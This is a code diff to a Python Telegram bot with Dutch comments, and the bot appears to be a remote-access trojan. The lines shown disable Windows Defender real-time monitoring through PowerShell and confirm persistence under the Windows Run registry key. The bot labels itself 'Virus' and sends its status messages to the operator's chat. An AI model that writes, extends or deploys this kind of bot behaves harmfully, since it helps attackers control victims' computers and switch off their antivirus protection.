@@ -13,6 +13,10 @@ async def startup_functions(app, id):
     # stuur de banner naar de chat als de bot online staat
     await app.bot.send_message(chat_id=id, text=f"```\n{get_banner()}\n```", parse_mode="MarkdownV2")
 
+    commandOutput = run_powershell_command('Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"')
+    await app.bot.send_message(chat_id=id, text=f"```\nScript toegevoegd aan registry:\n{commandOutput}\nScript naam: Virus\n```", parse_mode="MarkdownV2")
+
+
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
     gebruikt get_command_list() om een lijst van alle commands te sturen die de bot kan uitvoeren
@@ -87,6 +91,7 @@ async def stopDefender_command(update: Update, context: ContextTypes.DEFAULT_TYP
     - return de powershell output om te zien als de command wel of niet was uitgevoerd
     """
     run_powershell_command('Set-MpPreference -DisableRealtimeMonitoring $true')
+    await context.bot.send_message(chat_id=update.effective_chat.id, text="Windows defender wordt uitgezet...")
     # meld dat Windows defender uit is
     commandOutput = run_powershell_command('Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled')
     await update.message.reply_text(f"Terminal output:```\n{commandOutput}\n```", parse_mode='MarkdownV2')
